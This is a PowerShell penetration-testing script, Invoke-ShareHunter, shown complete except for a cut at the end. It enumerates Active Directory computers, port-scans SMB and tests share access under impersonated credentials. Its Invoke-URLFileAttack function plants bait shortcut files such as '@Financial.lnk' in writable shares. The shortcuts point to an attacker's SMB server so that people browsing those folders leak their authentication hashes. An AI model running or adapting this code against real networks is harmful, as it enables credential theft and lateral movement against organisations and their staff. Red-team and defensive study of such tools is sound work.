function Invoke-ShareHunter{

	<#

	.SYNOPSIS
	Invoke-ShareHunter Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-ShareHunter

	.DESCRIPTION
	Enumerate the Domain for Readable and Writable Shares
	
	.PARAMETER Domain
	The target domain to enumerate shares for
	
	.PARAMETER Server
	The target Server to bind to
	
	.PARAMETER Targets
	Provide comma-separated targets or target.txt or CIDR
	
	.PARAMETER NoPortScan
	Do not run a portscan before checking for shares
	
	.PARAMETER Timeout
	Timeout for the portscan before the port is considered closed (default: 50ms)

 	.PARAMETER ReadOnly
	Will not enumrate for writable shares
	
	.EXAMPLE
	Invoke-ShareHunter
	Invoke-ShareHunter -Domain ferrari.local
	Invoke-ShareHunter -Targets "Workstation-01.ferrari.local,DC01.ferrari.local"
 	Invoke-ShareHunter -TargetsFile C:\Users\Public\Documents\Shares.txt
	
	#>
	
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Domain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Targets,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$NoPortScan,

  		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Server,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Timeout,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Username,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Password,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$UserDomain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$CompareTo,

  		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[switch]
		$ReadOnly
		
	)
	
	if (($Username -or $Password -or $UserDomain) -and (-not $Username -or -not $Password -or -not $UserDomain)) {
		Write-Output ""
		Write-Output "[-] Please provide Username, Password, and UserDomain"
		Write-Output ""
		return
	}
	
	$ErrorActionPreference = "SilentlyContinue"
	
	if(!$Domain){
		try{
			$RetrieveDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
			$RetrieveDomain = $RetrieveDomain.Name
		}
		catch{$RetrieveDomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
		$Domain = $RetrieveDomain
	}
	
	if($Targets){
  		if(Test-Path $Targets){
			$Computers = Get-Content -Path $Targets
			$Computers = $Computers | Sort-Object -Unique
		}
		elseif ($Targets -match "/") {
			$split = $Targets.Split("/")
			$ipBase = $split[0]
			$maskBits = [int]$split[1]

			$ips = Get-SubnetAddresses -MaskBits $maskBits -IP $ipBase

			$Computers = @(Get-IPRange -Lower $ips[0] -Upper $ips[1])
		}
		else{
			$Computers = $Targets
			$Computers = $Computers -split ","
		}
	}
	
	else{
		Write-Output ""
		Write-Output "[+] Enumerating Computer Objects..."
		if($Domain -AND $Server){$Computers = Get-ADComputers -ADCompDomain $Domain -ADCompServer $Server}
		elseif($Domain -AND !$Server){$Computers = Get-ADComputers -ADCompDomain $Domain}
		else{$Computers = Get-ADComputers}	
	}

	$HostFQDN = [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
	$Computers = $Computers | Where-Object {$_ -ne "$HostFQDN"}
	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	
	$domainjoined = Test-DomainJoinStatus
	
	if(!$NoPortScan){
		
		Write-Output ""
		Write-Output "[+] Running Port Scan..."
	
		if(-not $Timeout){
			if($domainjoined){$Timeout = 50}
			else{$Timeout = 5000}
		}

		$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
		$runspacePool.Open()

		$runspaces = @()

		foreach ($Computer in $Computers) {
			$scriptBlock = {
				param($Computer, $Timeout)

				$tcpClient = New-Object System.Net.Sockets.TcpClient
				$asyncResult = $tcpClient.BeginConnect($Computer, 445, $null, $null)
				$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
				if ($wait) { 
					try {
						$tcpClient.EndConnect($asyncResult)
						$connected = $true
						return $Computer
					} catch {}
				}

				$tcpClient.Close()
			}

			$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Timeout)
			$runspace.RunspacePool = $runspacePool

			$runspaces += [PSCustomObject]@{
				Runspace = $runspace
				Status   = $runspace.BeginInvoke()
				Computer = $Computer
			}
		}

		# Initialize an array to store all reachable hosts
		$reachable_hosts = @()

		# Collect the results from each runspace
		$runspaces | ForEach-Object {
			$hostResult = $_.Runspace.EndInvoke($_.Status)
			if ($hostResult) {
				$reachable_hosts += $hostResult
			}
		}

		# Close and clean up the runspace pool
		$runspacePool.Close()
		$runspacePool.Dispose()

		$Computers = $reachable_hosts

 	}
	
	Write-Output ""
	Write-Output "[+] Enumerating Shares..."
	
	$functiontable = @()
	
	# Create runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	$runspaces = @()

	foreach ($Computer in $Computers) {
		$scriptBlock = {
			param($Computer, $domainjoined)
			
			$ipPattern = '\b(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)(?:\.(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)){3}\b'
			
			if(!$domainjoined -AND ($Computer -match $ipPattern)){$Computer = (Resolve-DnsName $Computer).NameHost}

			# Getting all shares including hidden ones
			$allResults = net view \\$Computer /ALL | Out-String

			$startDelimiter = "-------------------------------------------------------------------------------"
			$endDelimiter = "The command completed successfully."

			$extractShares = {
			    param($results)
			    
			    $startIndex = $results.IndexOf($startDelimiter)
			    $endIndex = $results.IndexOf($endDelimiter)
			
			    $capturedContent = $results.Substring($startIndex + $startDelimiter.Length, $endIndex - $startIndex - $startDelimiter.Length).Trim()
			
			    return ($capturedContent -split "`n") | Where-Object { $_ -match '^(.+?)\s{2,}' } | ForEach-Object { $matches[1] }
			}

			$allShares = & $extractShares $allResults

			# Create hashtable for each share
			return $allShares | ForEach-Object {
				@{
					'Targets'  = $Computer
					'Share'    = $_
					'FullShareName'    = $null
					'Readable' = 'NO'
					'Writable' = 'NO'
					'Domain'   = $Domain  # Assuming $Domain is available in this context
				}
			}
		}

		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($domainjoined)
		$runspace.RunspacePool = $runspacePool

		$runspaces += [PSCustomObject]@{
			Runspace = $runspace
			Status   = $runspace.BeginInvoke()
			Computer = $Computer
		}
	}
	
	# Initialize an array to store all shares
	$AllShares = @()

	# Collect the results from each runspace
	$runspaces | ForEach-Object {
		$shares = $_.Runspace.EndInvoke($_.Status)
		if ($shares) { 
			$functiontable += $shares
			
			# Populate $AllShares within this loop
			foreach($shareObj in $shares) {
				$shareObj.Domain = $Domain
				$sharename = "\\" + $shareObj.Targets + "\" + $shareObj.Share
				$shareObj.FullShareName = $sharename
				$AllShares += $sharename
			}
		} else {
			Write-Error "[-] No shares found for $($_.Computer)"
		}
	}

	# Close and clean up the runspace pool
	$runspacePool.Close()
	$runspacePool.Dispose()

	Write-Output ""
	Write-Output "[+] Testing Read Access..."

	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	$runspaces = @()

	foreach ($obj in $functiontable) {
		$scriptBlock = {
			param($obj, $Username, $Password, $UserDomain)
			
			# Define the required constants and structs
			Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
    LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
    LOGON32_PROVIDER_DEFAULT = 0,
}

public enum TOKEN_TYPE {
    TokenPrimary = 1,
    TokenImpersonation
}

public enum TOKEN_ACCESS : uint {
    TOKEN_DUPLICATE = 0x0002
}

public enum PROCESS_ACCESS : uint {
    PROCESS_QUERY_INFORMATION = 0x0400
}

public class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        String lpszUsername,
        String lpszDomain,
        String lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hToken);
}

public class Kernel32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
"@ -Language CSharp

			function Token-Impersonation {
				param (
					[Parameter(Mandatory=$true)]
					[string]$Username,

					[Parameter(Mandatory=$true)]
					[string]$Password,

					[Parameter(Mandatory=$true)]
					[string]$Domain
				)

				process {
					$tokenHandle = [IntPtr]::Zero
					if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
						throw "[-] Failed to obtain user token."
					}

					if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
						[Advapi32]::CloseHandle($tokenHandle)
						throw "[-] Failed to impersonate user."
					}
				}
			}

			function Revert-Token {process {[Advapi32]::RevertToSelf()}}
			
			# Impersonate User
			if($Username -AND $Password -AND $UserDomain){
				Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
			}

			$Error.clear()
			ls $obj.FullShareName > $null
			if (!$error[0]) {
				$obj.Readable = "YES"
				return $obj.FullShareName
			} else {
				return $null
			}
			
			# Revert Token
			if($Username -AND $Password -AND $UserDomain){Revert-Token}
		}

		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($obj).AddArgument($Username).AddArgument($Password).AddArgument($UserDomain)
		$runspace.RunspacePool = $runspacePool

		$runspaces += [PSCustomObject]@{
			Runspace = $runspace
			Status   = $runspace.BeginInvoke()
			Object   = $obj
		}
	}

	# Initialize an array to store all readable shares
	$ReadableShares = @()

	# Collect the results from each runspace
	$runspaces | ForEach-Object {
		$shareResult = $_.Runspace.EndInvoke($_.Status)
		if ($shareResult) {
			$ReadableShares += $shareResult
		}
	}

	# Close and clean up the runspace pool
	$runspacePool.Close()
	$runspacePool.Dispose()

 	$excludedShares = @('SYSVOL', 'Netlogon', 'print$', 'IPC$')
	$filteredReadableShares = $ReadableShares | Where-Object {
	    $shareName = $_ -split '\\' | Select-Object -Last 1
	    $shareName -notin $excludedShares
	}
	
	Write-Output ""
	Write-Host "[+] Readable Shares:" -ForegroundColor Cyan
	Write-Output ""
	$filteredReadableShares
	if($Username -AND $Password -AND $UserDomain){
		$filteredReadableShares | Out-File $pwd\Shares_$($Username)_Readable.txt -Force
		Write-Output ""
		Write-Output "[+] Output saved to: $pwd\Shares_$($Username)_Readable.txt"
	}
	else{
		$filteredReadableShares | Out-File $pwd\Shares_Readable.txt -Force
		Write-Output ""
		Write-Output "[+] Output saved to: $pwd\Shares_Readable.txt"
	}
	
	Write-Output ""
 	if(!$ReadOnly){
		#Write-Output ""
		Write-Output "[+] Checking for Writable Shares..."
	
		$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
		$runspacePool.Open()
	
		$runspaces = @()
	
		foreach ($Share in $ReadableShares) {
			$scriptBlock = {
				
				param($Share, $Username, $Password, $UserDomain)
				
				# Define the required constants and structs
				Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
	LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
	LOGON32_PROVIDER_DEFAULT = 0,
}

public enum TOKEN_TYPE {
	TokenPrimary = 1,
	TokenImpersonation
}

public enum TOKEN_ACCESS : uint {
	TOKEN_DUPLICATE = 0x0002
}

public enum PROCESS_ACCESS : uint {
	PROCESS_QUERY_INFORMATION = 0x0400
}

public class Advapi32 {
	[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern bool LogonUser(
		String lpszUsername,
		String lpszDomain,
		String lpszPassword,
		LogonType dwLogonType,
		LogonProvider dwLogonProvider,
		out IntPtr phToken
	);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool RevertToSelf();

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool CloseHandle(IntPtr hToken);
}

public class Kernel32 {
	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
}
"@ -Language CSharp

				function Token-Impersonation {
					param (
						[Parameter(Mandatory=$true)]
						[string]$Username,

						[Parameter(Mandatory=$true)]
						[string]$Password,

						[Parameter(Mandatory=$true)]
						[string]$Domain
					)

					process {
						$tokenHandle = [IntPtr]::Zero
						if (-not [Advapi32]::LogonUser($Username, $Domain, $Password, [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS, [LogonProvider]::LOGON32_PROVIDER_DEFAULT, [ref]$tokenHandle)) {
							throw "[-] Failed to obtain user token."
						}

						if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
							[Advapi32]::CloseHandle($tokenHandle)
							throw "[-] Failed to impersonate user."
						}
					}
				}

				function Revert-Token {process {[Advapi32]::RevertToSelf()}}
				
				# Impersonate User
				if($Username -AND $Password -AND $UserDomain){
					Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
				}
				
				function Test-Write {
					[CmdletBinding()]
					param (
						[parameter()]
						[string] $Path
					)
					try {
						$testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
						$fileStream = [IO.File]::Create($testPath, 1, 'DeleteOnClose')
						$fileStream.Close()
						return "$Path"
					} finally {
						Remove-Item $testPath -ErrorAction SilentlyContinue
					}
				}
				
				try {
					$result = Test-Write -Path $Share
					return @{
						Share = $Share
						Result = $result
						Error = $null
					}
				} catch {
					return @{
						Share = $Share
						Result = $null
						Error = $_.Exception.Message
					}
				}
			}
	
	
			$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Share).AddArgument($Username).AddArgument($Password).AddArgument($UserDomain)
	
			$runspace.RunspacePool = $runspacePool
	
			$runspaces += [PSCustomObject]@{
				Runspace = $runspace
				Status   = $runspace.BeginInvoke()
				Share    = $Share
			}
			
			# Revert Token
			if($Username -AND $Password -AND $UserDomain){Revert-Token > $null}
		}
	
		# Initialize an array to store all writable shares
		$WritableShares = @()
	
		# Collect the results from each runspace
		$runspaces | ForEach-Object {
			$runspaceData = $_.Runspace.EndInvoke($_.Status)
			if ($runspaceData.Result) {
				$WritableShares += $runspaceData.Result
			}
		}
	
		# Close and clean up the runspace pool
		$runspacePool.Close()
		$runspacePool.Dispose()
		
		foreach ($Share in $WritableShares) {
			foreach ($obj in $functiontable) {
				if($obj.FullShareName -eq $Share){
					$obj.Writable = "YES"
				}
			}
		}
		
		Write-Output ""
		Write-Host "[+] Writable Shares:" -ForegroundColor Cyan
		Write-Output ""
		$WritableShares
		if($Username -AND $Password -AND $UserDomain){
			$WritableShares | Out-File $pwd\Shares_$($Username)_Writable.txt -Force
			Write-Output ""
			Write-Output "[+] Output saved to: $pwd\Shares_$($Username)_Writable.txt"
		}
		else{
			$WritableShares | Out-File $pwd\Shares_Writable.txt -Force
			Write-Output ""
			Write-Output "[+] Output saved to: $pwd\Shares_Writable.txt"
		}		
		Write-Output ""
		
		$FinalTable = @()
	
	 	$excludedShares = @('SYSVOL', 'Netlogon', 'print$', 'IPC$')
		
		$FinalTable = foreach ($obj in $functiontable) {
	 		$shareName = ($obj.FullShareName -split '\\')[-1]
	   		if (-not ($shareName -in $excludedShares -and $obj.Writable -ne "YES")) {
				if($obj.Readable -eq "YES"){
					[PSCustomObject]@{
						'Targets'  = $obj.Targets
						'Share Name'    = $obj.FullShareName
						'Readable' = $obj.Readable
						'Writable' = $obj.Writable
						'Domain'   = $obj.Domain  # Assuming $Domain is available in this context
					}
				}
	  		}
		}
		
		$FinalResults = $FinalTable | Sort-Object -Unique "Domain","Writable","Targets","Share Name" | ft -Autosize -Wrap
		#Write-Output ""
		Write-Host "[+] Results Table:" -ForegroundColor Cyan
		($FinalResults | ft -Autosize -Wrap | Out-String).TrimEnd()
		Write-Output ""
		if($Username -AND $Password -AND $UserDomain){
			$FinalResults | Out-File $pwd\Shares_$($Username)_Results.txt -Force
			Write-Output "[+] Output saved to: $pwd\Shares_$($Username)_Results.txt"
			Write-Output ""
			if($CompareTo -AND (Test-Path $CompareTo)){
				$CompReadableShares = Get-Content -Path $CompareTo
				$CompResultsShares = Get-Content -Path "$pwd\Shares_$($Username)_Readable.txt"
				Write-Output ""
				Write-Output "[+] Shares readable by $Username and not contained in $($CompareTo):"
				Write-Output ""
				$differences = Compare-Object -ReferenceObject $CompReadableShares -DifferenceObject $CompResultsShares -PassThru | Where-Object { $_.SideIndicator -eq '=>' }
				$differences | ForEach-Object { Write-Output "$_" }
				Write-Output ""
				Write-Output ""
			}
			elseif(Test-Path $pwd\Shares_Readable.txt){
				$CompReadableShares = Get-Content -Path "$pwd\Shares_Readable.txt"
				$CompResultsShares = Get-Content -Path "$pwd\Shares_$($Username)_Readable.txt"
				Write-Output ""
				Write-Output "[+] Shares readable by $Username and not contained in $pwd\Shares_Readable.txt:"
				Write-Output ""
				$differences = Compare-Object -ReferenceObject $CompReadableShares -DifferenceObject $CompResultsShares -PassThru | Where-Object { $_.SideIndicator -eq '=>' }
				if($differences){$differences | ForEach-Object { Write-Output "$_" }}
				else{Write-Output "[-] None"}
				Write-Output ""
				Write-Output ""
			}
		}
		else{
			$FinalResults | Out-File $pwd\Shares_Results.txt -Force
			Write-Output "[+] Output saved to: $pwd\Shares_Results.txt"
			Write-Output ""
			if($CompareTo -AND (Test-Path $CompareTo)){
				$CompReadableShares = Get-Content -Path $CompareTo
				$CompResultsShares = Get-Content -Path "$pwd\Shares_Readable.txt"
				Write-Output ""
				Write-Output "[+] Shares readable by current user and not contained in $($CompareTo):"
				Write-Output ""
				$differences = Compare-Object -ReferenceObject $CompReadableShares -DifferenceObject $CompResultsShares -PassThru | Where-Object { $_.SideIndicator -eq '=>' }
				if($differences){$differences | ForEach-Object { Write-Output "$_" }}
				else{Write-Output "[-] None"}
				Write-Output ""
				Write-Output ""
			}
		}
		Write-Output "[+] To perform a URLFile Attack run the following command:"
		Write-Output ""
		if($Username -and $Password -and $UserDomain){
			Write-Output "Invoke-URLFileAttack -WritableShares `"$pwd\Shares_$($Username)_Writable.txt`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
			Write-Output ""
		}
		else{
			Write-Output "Invoke-URLFileAttack -WritableShares `"$pwd\Shares_Writable.txt`""
			Write-Output ""
		}
  	}
}

function Get-ADComputers {
    param (
        [string]$ADCompDomain,
		[string]$ADCompServer
    )

    $allcomputers = @()
    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher

    # Construct distinguished name for the domain.
    if ($ADCompDomain -and !$ADCompServer) {
        $domainDN = "DC=" + ($ADCompDomain -replace "\.", ",DC=")
        $ldapPath = "LDAP://$domainDN"
        $objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
    } 
	elseif($ADCompDomain -AND $ADCompServer){
		$domainDN = "DC=" + ($ADCompDomain -replace "\.", ",DC=")
		$ldapPath = "LDAP://$ADCompServer/$domainDN"
		$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
	}
	else {
        $objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
    }

    # LDAP search request setup.
    $objSearcher.Filter = "(&(sAMAccountType=805306369)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $objSearcher.PageSize = 1000  # Handling paging internally
    $objSearcher.PropertiesToLoad.Clear() | Out-Null
    $objSearcher.PropertiesToLoad.Add("dNSHostName") | Out-Null

    # Perform the search
    $results = $objSearcher.FindAll()

    # Process the results
    foreach ($result in $results) {
        $allcomputers += $result.Properties["dNSHostName"]
    }

    return $allcomputers | Sort-Object -Unique
}

function Invoke-URLFileAttack{
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Username,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Password,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$UserDomain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[ValidateScript({
			if ($_ -match '[<>:"/\\|?*]') {
				throw "The value for URLAttackFileName contains invalid characters. Please provide a name without any of the following characters: < > : `" / \ | ? *"
			}
			return $true
		})]
		[String]
		$URLAttackFileName,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$SMBServerIP,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$WritableShares
	)
	
	if (($Username -or $Password -or $UserDomain) -and (-not $Username -or -not $Password -or -not $UserDomain)) {
		Write-Output ""
		Write-Output "[-] Please provide Username, Password, and UserDomain"
		Write-Output ""
		return
	}
	
	elseif($Username -AND $Password -AND $UserDomain){
		Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
	}
	
	if(!$SMBServerIP){
		Write-Output ""
		Write-Output "[-] Please provide the IP address of your SMB Server using the -SMBServerIP parameter (e.g.: -SMBServerIP `"10.0.2.10`")"
		Write-Output ""
		return
	}
	
	if(!$WritableShares){
		Write-Output ""
		Write-Output "[-] Please provide the location of the file containing a list of Writable Shares using the -WritableShares parameter (e.g.: -WritableShares `"C:\Users\Public\Documents\Shares_Writable.txt`")"
		Write-Output ""
		return
	}
	
	Write-Output ""
	Write-Output "[+] URL File Attack in progress..."
	Write-Output ""
	Write-WARNING "Don't forget to clean after yourself once you are done with this attack..."
	Write-Output ""
	
	if($URLAttackFileName){
		Write-Output "[*] File Name: @$URLAttackFileName"
		Write-Output ""
	}
	else{
		$URLAttackFileName = "Financial"
		Write-Output "[*] File Name: @$URLAttackFileName"
		Write-Output ""
	}
	
	$FailedURLFileAttack = @()
	
	Get-Content $WritableShares | ForEach-Object {
		$filePath = Join-Path -Path $_ -ChildPath "\@$URLAttackFileName.lnk"
		try{
			$jwsh = new-object -ComObject wscript.shell
			$jshortcut = $jwsh.CreateShortcut($filePath)
			$jshortcut.TargetPath = "\\$SMBServerIP\@threat.png"
			$jshortcut.WindowStyle = 1
			$jshortcut.IconLocation = "%windir%\system32\shell32.dll, 3"
			$jshortcut.Description = "Browsing to the dir this file lives in will perform an authentication request."
			$jshortcut.HotKey = "Ctrl+Alt+O"
			$jshortcut.Save()
		}
		catch{$FailedURLFileAttack += "$filePath"}
	}
	
	Write-Output "[+] Done"
	Write-Output ""
	if($FailedURLFileAttack){
		Write-Output "[-] The following shortcuts failed to be created:"
		Write-Output ""
		foreach($FileFailed in $FailedURLFileAttack){
			Write-Output "$FileFailed"
		}
		Write-Output ""
	}
	Write-Output "[+] To clean-up after this attack run the following command:"
	Write-Output ""
	if($Username -and $Password -and $UserDomain){
		$CleanupHeader = "[+] To clean-up after this attack run the following command:"
		$CleanupCommand = "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
		if (-Not (Test-Path -Path "$pwd\Shares_$($Username)_CleanupCommand.txt")) {New-Item -Path "$pwd\Shares_$($Username)_CleanupCommand.txt" -ItemType File -Force > $null}
		$CleanupHeader | Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt"
		Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt" -Value ""
		$CleanupCommand | Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt"
		Add-Content -Path "$pwd\Shares_$($Username)_CleanupCommand.txt" -Value ""
		Write-Output "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
		Write-Output ""
	}
	else{
		$CleanupHeader = "[+] To clean-up after this attack run the following command:"
		$CleanupCommand = "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`" -Username `"$Username`" -Password `"$Password`" -UserDomain `"$UserDomain`""
		if (-Not (Test-Path -Path "$pwd\Shares_CleanupCommand.txt")) {New-Item -Path "$pwd\Shares_CleanupCommand.txt" -ItemType File -Force > $null}
		$CleanupHeader | Add-Content -Path "$pwd\Shares_CleanupCommand.txt"
		Add-Content -Path "$pwd\Shares_CleanupCommand.txt" -Value ""
		$CleanupCommand | Add-Content -Path "$pwd\Shares_CleanupCommand.txt"
		Add-Content -Path "$pwd\Shares_CleanupCommand.txt" -Value ""
		Write-Output "Invoke-URLFileClean -WritableShares `"$WritableShares`" -URLAttackFileName `"$URLAttackFileName`""
		Write-Output ""
	}
	
	# Revert Token
	if($Username -AND $Password -AND $UserDomain){Revert-Token > $null}
	
	return
}

function Invoke-URLFileClean{
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Username,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$Password,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$UserDomain,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[ValidateScript({
			if ($_ -match '[<>:"/\\|?*]') {
				throw "The value for URLAttackFileName contains invalid characters. Please provide a name without any of the following characters: < > : `" / \ | ? *"
			}
			return $true
		})]
		[String]
		$URLAttackFileName,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$SMBServerIP,
		
		[Parameter (Mandatory=$False, ValueFromPipeline=$true)]
		[String]
		$WritableShares
	)
	
	if (($Username -or $Password -or $UserDomain) -and (-not $Username -or -not $Password -or -not $UserDomain)) {
		Write-Output ""
		Write-Output "[-] Please provide Username, Password, and UserDomain"
		Write-Output ""
		return
	}
	
	elseif($Username -AND $Password -AND $UserDomain){
		Token-Impersonation -Username $Username -Domain $UserDomain -Password $Password
	}
	
	if(!$WritableShares){
		Write-Output ""
		Write-Output "[-] Please provide the location of the file containing a list of Writable Shares using the -WritableShares parameter (e.g.: -WritableShares `"C:\Users\Public\Documents\Shares_Writable.txt`")"
		Write-Output ""
		return
	}
	
	Write-Output ""
	Write-Output "[+] Cleaning after a previous URL File attack..."
	Write-Output ""
	
	if($URLAttackFileName){
		Write-Output "[*] File Name: @$URLAttackFileName"
		Write-Output ""
	}
	else{
		$URLAttackFileName = "Financial"
		Write-Output "[*] File Name: @$URLAttackFileName"
		Write-Output ""
	}
	
	$FailedURLFileClean = @()
	
	Get-Content $WritableShares | ForEach-Object {
		$filePath = Join-Path -Path $_ -ChildPath "\@$URLAttackFileName.lnk"
		try{Remove-Item -Path $filePath -Force -ErrorAction Stop}
		catch{$FailedURLFileClean += $filePath}
	}
	
	Write-Output "[+] Done"
	Write-Output ""
	if($FailedURLFileClean){
		Write-Output "[-] The following shortcuts failed to be deleted:"
		Write-Output ""
		foreach($FileFailed in $FailedURLFileClean){
			Write-Output "$FileFailed"
		}
		Write-Output ""
	}
	
	# Revert Token
	if($Username -AND $Password -AND $UserDomain){Revert-Token > $null}
	
	return
}

# Define the required constants and structs
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
	LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
	LOGON32_PROVIDER_DEFAULT = 0,
}

public enum TOKEN_TYPE {
	TokenPrimary = 1,
	TokenImpersonation
}

public enum TOKEN_ACCESS : uint {
	TOKEN_DUPLICATE = 0x0002
}

public enum PROCESS_ACCESS : uint {
	PROCESS_QUERY_INFORMATION = 0x0400
}

public class Advapi32 {
	[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern bool LogonUser(
		String lpszUsername,
		String lpszDomain,
		String lpszPassword,
		LogonType dwLogonType,
		LogonProvider dwLogonProvider,
		out IntPtr phToken
	);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	
	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool RevertToSelf();

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool CloseHandle(IntPtr hToken);
}

public class Kernel32 {
	[DllImport("kernel32.dll", SetLastError = true)]
